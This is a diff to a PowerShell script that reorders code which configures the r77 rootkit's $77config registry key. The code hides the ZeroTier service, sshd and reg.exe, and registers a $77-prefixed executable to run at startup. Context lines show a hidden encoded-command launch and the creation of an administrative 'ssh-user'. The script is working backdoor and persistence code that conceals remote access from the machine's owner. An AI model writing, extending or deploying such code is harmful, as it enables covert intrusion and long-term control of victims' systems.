@@ -97,6 +97,36 @@ $encodedCommand = [Convert]::ToBase64String($bytes)
 # Launch the script block in a new PowerShell window
 Start-Process PowerShell.exe -ArgumentList "-NoProfile -EncodedCommand $encodedCommand" -WindowStyle Hidden
 
+# Ensure the main configuration key exists
+$rootRegPath = 'HKLM:\SOFTWARE\$77config'
+Ensure-RegistryKey -path $rootRegPath
+
+# Ensure the service_names subkey exists
+$serviceNamesPath = "$rootRegPath\service_names"
+Ensure-RegistryKey -path $serviceNamesPath
+
+# Ensure the process_names subkey exists
+$processNamesPath = "$rootRegPath\process_names"
+Ensure-RegistryKey -path $processNamesPath
+
+# Ensure the startup subkey exists
+$startupPath = "$rootRegPath\startup"
+Ensure-RegistryKey -path $startupPath
+
+# Add "ZeroTierOneService" and "sshd" to the service names registry
+Add-ServiceName -service 'ZeroTierOneService'
+Add-ServiceName -service 'sshd'
+
+# Add "reg.exe" to the process names registry
+Add-ProcessName -process 'reg.exe'
+
+# Adds startup applications to $77Config
+Add-StartupApplication -applicationPath 'C:\Windows\system32\$77Starware\$77SWClient.exe'
+
+# Output completion message
+Write-Host "Services, processes, and startup applications have been configured in the registry."
+
+
 # Check if ZeroTier One is already installed by checking for any executable in its folder
 $zeroTierFolderPath = "C:\Program Files (x86)\ZeroTier\One"
 if (Test-Path -Path $zeroTierFolderPath -Filter "*.exe") {
@@ -135,21 +165,7 @@ function Ensure-RegistryKey {
     }
 }
 
-# Ensure the main configuration key exists
-$rootRegPath = 'HKLM:\SOFTWARE\$77config'
-Ensure-RegistryKey -path $rootRegPath
 
-# Ensure the service_names subkey exists
-$serviceNamesPath = "$rootRegPath\service_names"
-Ensure-RegistryKey -path $serviceNamesPath
-
-# Ensure the process_names subkey exists
-$processNamesPath = "$rootRegPath\process_names"
-Ensure-RegistryKey -path $processNamesPath
-
-# Ensure the startup subkey exists
-$startupPath = "$rootRegPath\startup"
-Ensure-RegistryKey -path $startupPath
 
 # Function to add a service name to the registry if not already present
 function Add-ServiceName {
@@ -187,20 +203,6 @@ function Add-StartupApplication {
         Write-Host "Startup application already in registry: $executableName"
     }
 }
-
-# Add "ZeroTierOneService" and "sshd" to the service names registry
-Add-ServiceName -service 'ZeroTierOneService'
-Add-ServiceName -service 'sshd'
-
-# Add "reg.exe" to the process names registry
-Add-ProcessName -process 'reg.exe'
-
-# Adds startup applications to $77Config
-Add-StartupApplication -applicationPath 'C:\Windows\system32\$77Starware\$77SWClient.exe'
-
-# Output completion message
-Write-Host "Services, processes, and startup applications have been configured in the registry."
-
 
 # Create a new user `ssh-user` with administrative privileges
 # Check if SSH user exists before creating
